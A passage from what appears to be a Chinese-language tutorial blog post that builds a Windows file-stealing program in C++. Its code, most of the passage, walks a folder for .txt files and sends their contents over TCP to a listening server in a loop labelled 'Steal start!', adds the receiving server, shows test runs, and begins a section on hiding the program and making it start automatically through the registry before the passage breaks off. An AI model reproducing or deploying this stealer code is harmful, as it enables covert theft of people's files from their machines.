class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用自定义函数，估计也要通过c&#x2F;s模式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_mypath)</span></span>&#123;</span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件内容</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//尽量调合适大小，避免缓冲区溢出</span></span><br><span class="line">FILE *fp = <span class="built_in">fopen</span>(_mypath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span> *)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send erroNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与之前tcp客户端不同的是此处不需要接受数据，因为传递是通过形参的。</p><hr><p>完整的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SendtoServer</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_mypath)</span></span>&#123;</span><br><span class="line"><span class="comment">//*初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WSAStartup errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LOBYTE errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket对象</span></span><br><span class="line">SOCKET sockCli = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockCli)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置要连接的服务器</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//本机ip地址测试</span></span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(sockCli, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect errorNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//收发数据，对比服务器，客户端应是先收后发</span></span><br><span class="line"><span class="comment">//char recvBuf[100] = &#123; 0 &#125;;</span></span><br><span class="line"><span class="comment">//int iLen = recv(sockCli, recvBuf, 100, 0);</span></span><br><span class="line"><span class="comment">//printf(&quot;recvBuf = %s\n&quot;, recvBuf);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取文件内容</span></span><br><span class="line"><span class="type">char</span> sendBuf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//尽量调合适大小，避免缓冲区溢出</span></span><br><span class="line">FILE *fp = <span class="built_in">fopen</span>(_mypath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">fread</span>(sendBuf, <span class="number">1</span>, <span class="number">1024</span>, fp);</span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line"><span class="type">int</span> iLen = <span class="built_in">send</span>(sockCli, (<span class="type">char</span> *)sendBuf, <span class="number">100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (iLen &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send erroNum = %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭套接字</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockCli);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(mypath, <span class="string">&quot;.txt&quot;</span>))&#123;</span><br><span class="line"><span class="built_in">SendtoServer</span>(mypath);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>, mypath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:/mysdk/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化网络库</span></span><br><span class="line">WORD wVersionRequested;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="type">char</span> msg[MAX_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">wVersionRequested = <span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">err = <span class="built_in">WSAStartup</span>(wVersionRequested, &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;WSAtartup error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">2</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;LOBYTE error!&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造socket</span></span><br><span class="line">SOCKET sockSer = <span class="built_in">socket</span>(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sockSer)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;socket error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//填充参数</span></span><br><span class="line">SOCKADDR_IN addrSer;</span><br><span class="line">addrSer.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">addrSer.sin_family = AF_INET;<span class="comment">//ipv4</span></span><br><span class="line">addrSer.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);<span class="comment">//端口号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockSer, (SOCKADDR *)&amp;addrSer, <span class="built_in">sizeof</span>(SOCKADDR)))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockSer, <span class="number">5</span>))&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;listen error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接收</span></span><br><span class="line">SOCKADDR_IN addCli;</span><br><span class="line"><span class="type">int</span> cliSize = <span class="built_in">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKET cliSock;</span><br><span class="line"><span class="type">int</span> strLen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">cliSock = <span class="built_in">accept</span>(sockSer, (SOCKADDR *)&amp;addCli, &amp;cliSize);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == cliSock)&#123;</span><br><span class="line"><span class="built_in">ErrorHanding</span>(<span class="string">&quot;accept error!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(msg, <span class="number">0</span>, MAX_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((strLen = <span class="built_in">recv</span>(cliSock,msg,MAX_SIZE,<span class="number">0</span>)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server msg:%s\n&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(cliSock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//over closesocket</span></span><br><span class="line"><span class="built_in">closesocket</span>(sockSer);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是稍微做了一些优化</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//console error tips</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHanding</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *_msg)</span></span>&#123;</span><br><span class="line"><span class="built_in">fputs</span>(_msg, stderr);</span><br><span class="line"><span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种处理错误的时候，每次提示错误，return -1也麻烦，干脆封装到函数里。</p><hr><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先调整一下客户端，做一个持续延时发送</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:/mysdk/&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后先跑到debug文件夹启动服务器<br>在vs中跑客户端程序</p><img src="/2022/07/16/winFiles/004.png" class=""><p>可以看到持续发送之后，因为文件夹里面就放了一个.txt文件，所以一直都是读取这个文件。</p><p>然后可以多创几个txt试试</p><img src="/2022/07/16/winFiles/005.png" class=""><p>现在一共三个.txt文件，然后在循环跑出其中的内容。</p><img src="/2022/07/16/winFiles/006.png" class=""><p>中文乱码跟文件编码有关系，txt默认可能是utf-8，然后vs的项目我也忘看改成啥了多字节还是Unicode，倒不是啥大问题，通信正常就行。</p><p>算了还是改一下吧，将项目修改成多字节，然后文件另存为的时候可以修改编码，或者你有notepad的话可以直接改，记事本好像只能另存为的时候改。</p><img src="/2022/07/16/winFiles/007.png" class=""><p>改完之后再跑一次</p><img src="/2022/07/16/winFiles/008.png" class=""><p>可以看到没问题，中文显示正常。</p><p>printf可能会有缓冲的问题，可能表现在打印很多次之后会卡住一会。<br>那么则可能要用puts之类直接打印字符串的。虽然都差不多。目前是不关注了。</p><blockquote><p>1、不同的换行符<br>puts（）函数会自动在字符串末尾添加一个换行符，这意味着它会自动换行，而printf（）函数没有此功能。<br>2、输出内容不同<br>puts（）函数只能输出字符串，不能对输出和转换指令进行标准化，而printf（）函数可以。</p></blockquote><hr><h2 id="隐藏和自启动"><a href="#隐藏和自启动" class="headerlink" title="隐藏和自启动"></a>隐藏和自启动</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddToSystem</span><span class="params">()</span></span>&#123;</span><br><span class="line">HKEY hkey;<span 